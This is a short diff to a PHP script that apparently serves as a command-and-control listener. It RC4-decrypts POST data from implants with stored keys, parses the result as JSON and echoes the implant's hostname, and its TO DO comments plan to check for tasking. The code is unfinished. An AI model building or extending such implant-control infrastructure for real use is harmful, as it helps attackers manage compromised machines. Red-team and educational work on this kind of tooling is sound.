@@ -58,12 +58,22 @@
 
         # Loops through each queried encryption key to determine if it can decrypt the POST data
         foreach ($results as $row) {
+            # Tries to decrypt POST data
             $maybe_decrypted = rc4($row["encryption_key"], $raw_post_data);
+            
+            # If not null, we have successful decryption
+            if (!is_null(json_decode($maybe_decrypted))) {
+                # Saves implant details into an array
+                # "true" is needed here so it returns an array instead of an object
+                $implant = json_decode($maybe_decrypted, true);
 
-            echo "Maybe Decrypted: " . $maybe_decrypted;
+                # DEBUGGING
+                echo $implant["hostname"] . "\r\n";
 
-            # TO DO: After trying to decrypt, look for which one has the "nonce" POST parameter
-            # If we see that "nonce" POST parameter, we know we have successful decryption
+                # TO DO: Get all implant information from implant array
+
+                # TO DO: Use that gathered information to check for tasking
+            }
         }
     }
 ?>
